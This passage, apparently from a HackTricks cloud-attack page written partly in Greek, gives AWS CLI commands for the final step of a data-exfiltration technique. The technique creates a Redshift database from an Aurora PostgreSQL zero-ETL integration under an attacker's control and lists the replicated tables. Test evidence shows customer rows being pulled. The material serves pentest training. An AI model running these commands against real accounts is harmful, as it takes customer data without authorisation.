<summary>5) Υλοποίηση και ερώτηση αναπαραχθέντων δεδομένων στο Redshift</summary>
```bash
# Create a Redshift database from the inbound integration (use integration_id from SVV_INTEGRATION)
aws redshift-data execute-statement --region $REGION --workgroup-name ztl-wg --database dev \
--sql "select integration_id from svv_integration"  # take the GUID value
aws redshift-data execute-statement --region $REGION --workgroup-name ztl-wg --database dev \
--sql "create database ztl_db from integration '<integration_id>' database postgres"
# List tables replicated
aws redshift-data execute-statement --region $REGION --workgroup-name ztl-wg --database ztl_db \
--sql "select table_schema,table_name from information_schema.tables where table_schema not in ('pg_catalog','information_schema') order by 1,2 limit 20;"
```
</details>

Αποδείξεις που παρατηρήθηκαν στη δοκιμή:
- redshift describe-inbound-integrations: Status ACTIVE for Integration arn:...377a462b-...
- SVV_INTEGRATION showed integration_id 377a462b-c42c-4f08-937b-77fe75d98211 and state PendingDbConnectState prior to DB creation.
- After CREATE DATABASE FROM INTEGRATION, listing tables revealed schema ztl and table customers; selecting from ztl.customers returned 2 rows (Alice, Bob).

Impact: Συνεχής, σχεδόν σε πραγματικό χρόνο, εξαγωγή επιλεγμένων πινάκων Aurora PostgreSQL σε Redshift Serverless υπό τον έλεγχο του επιτιθέμενου, χωρίς χρήση διαπιστευτηρίων βάσης δεδομένων, αντιγράφων ασφαλείας ή δικτυακής πρόσβασης στο source cluster.


{{#include ../../../banners/hacktricks-training.md}}
